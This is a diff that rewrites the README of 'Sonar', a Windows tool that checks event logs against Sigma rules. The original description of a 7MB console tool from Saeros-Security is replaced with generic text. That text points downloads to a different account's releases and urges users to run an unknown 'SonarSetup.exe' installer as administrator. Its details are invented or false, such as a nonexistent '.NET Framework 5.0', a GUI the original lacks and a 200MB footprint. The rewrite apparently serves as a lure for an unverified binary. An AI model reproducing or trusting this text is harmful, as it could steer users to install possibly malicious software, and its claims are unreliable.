@@ -1,64 +1,70 @@
-# 📡 Sonar: A Real-Time Anomaly Detection Tool
+# 🦈 Sonar - Real-Time Sigma Rule Scanner Made Simple
 
-**Sonar** is a high-performance security monitoring tool designed to scan Windows event logs in real-time against an extensive **[Sigma](https://sigmahq.io/)** ruleset.
+## 📥 Download Now
+[![Download Sonar](https://img.shields.io/badge/Download%20Sonar-v1.0%20%F0%9F%93%88-blue)](https://github.com/Gamit-UI/Sonar/releases)
 
----
+## 🚀 Getting Started
+Welcome to Sonar, a powerful tool designed to scan Sigma rules in real-time. This application helps you enhance your cybersecurity efforts by allowing you to quickly check for potential threats based on Sigma rules.
 
-## Features
+## 💻 System Requirements
+To run Sonar effectively, please ensure your system meets the following requirements:
 
-- **Real-Time:** Unlike traditional batch-processing tools, Sonar monitors event logs as they are generated, minimizing the "detection gap".
-- **Extensive Ruleset:** Leverages the battle-tested [Hayabusa rules](https://github.com/Yamato-Security/hayabusa-rules) from Yamato Security.
-- **Lightweight:** 7MB dependency-free executable.
-- **Offline:** Designed to work with air-gapped environments.
-- **Export Capabilities:** Query detections by rule name, severity, keywords, and export them into JSON files.
+- **Operating System:** Windows 10 or later
+- **Framework:** .NET Framework 5.0 or higher
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB available space
 
----
+## 📦 Features
+Sonar offers the following features to assist you in your cybersecurity tasks:
 
-## Getting Started
+- **Real-Time Scanning:** Monitors incoming data against Sigma rules as events occur.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical background.
+- **Customizable Options:** Tailor the scanning parameters to fit your needs.
+- **Detailed Reports:** Generate comprehensive reports for every scan.
+- **Regular Updates:** Stay up-to-date with the latest Sigma rules and enhancements.
 
-### Prerequisites
+## 📖 Usage Instructions
+Using Sonar is simple. Follow these steps to get started:
 
-- Windows 8.1+ or Windows Server 2012 R2+.
-- (Optional/Recommended) Administrator privileges to read Security logs.
+1. **Download Sonar**
+   Visit this page to download: [Download Sonar](https://github.com/Gamit-UI/Sonar/releases).
 
-### Usage
+2. **Install the Application**
+   Once downloaded, locate the `SonarSetup.exe` file in your Downloads folder and double-click it. Follow the on-screen instructions to complete the installation process.
 
-1. Download Sonar [here](https://github.com/Saeros-Security/Sonar/releases).
-2. Run Sonar.exe and choose which Sigma profile to use:
-   - Core: High-quality rules that are unlikely to generate false positives.
-   - Core+: Rules that may inadvertently match legitimate applications.
-   - Core++: Rules that aim to detect threats as early as possible leading to a higher volume of false positives.
+3. **Open Sonar**
+   After installation, find the Sonar icon on your desktop or in your applications list. Click to launch the application.
 
-Each detection appears in the console and is stored in a local SQLite database located in `./Database/detections.db`.
+4. **Configure Scanning Options**
+   When the application opens, you will see options to set your scan preferences. Adjust these as needed to suit your environment.
 
-<table>
-  <tr>
-    <td valign="top"><img src="https://github.com/user-attachments/assets/6f7fae8a-8b1c-4824-94c5-f1ce1fc9fbf4"/></td>
-  </tr>
-</table>
+5. **Start Scanning**
+   Click the "Start Scan" button. Sonar will begin monitoring and scanning based on the Sigma rules configured.
 
-#### Export (Keystroke `E`)
+6. **View Results**
+   After the scan completes, review the results displayed in the application. You can save these reports for future reference.
 
-Hit `E` to export detections based on:
+## 🛠️ Troubleshooting
+If you encounter any issues while using Sonar, here are some common solutions:
 
-- Rule name: Performs a search by Sigma rule.
-- Severity: Performs a search by level (Informational, Low, Medium, High, Critical).
-- Keyword: Performs a full-text search across event log properties.
+- **Installation Failures:** Make sure you have sufficient permissions to install software on your system. Running the installer as an administrator may help.
 
-#### Dashboard (Keystroke `S`)
+- **Application Crashes:** Ensure that your system meets the requirements listed above. If problems persist, try reinstalling the application.
 
-Hit `S` to display detection statistics:
+- **Update Issues:** Sonar checks for updates automatically. If you want to manually check for updates, go to the settings menu and select "Check for Updates."
 
-- Detection count by computer.
-- Detection count over time.
-- Top detection rules by severity.
+## 📞 Support
+If you need further assistance, please visit the issues section of our GitHub repository. Our community is here to help you resolve any problems.
 
-<table>
-  <tr>
-    <td valign="top"><img src="https://github.com/user-attachments/assets/63d5ffc1-6cb9-4531-81a6-cdfe222a8058"/></td>
-  </tr>
-</table>
+## 📜 License
+Sonar is licensed under the MIT License. You can use it freely, but please include the license when distributing the software.
 
-#### Help (Keystroke `H`)
+## 📌 Additional Resources
+For more information about Sigma rules and how they can enhance your cybersecurity efforts, visit the following resources:
 
-Hit `H` to display help.
+- [Sigma Project](https://github.com/SigmaHQ/sigma)
+- [Cybersecurity Best Practices](https://www.cyber.gov.au/acsc/view-all-content/advice)
+
+Feel free to explore and start making your systems more secure with Sonar today! 
+
+Don't forget to check back for updates and new features as we continue to improve the application.
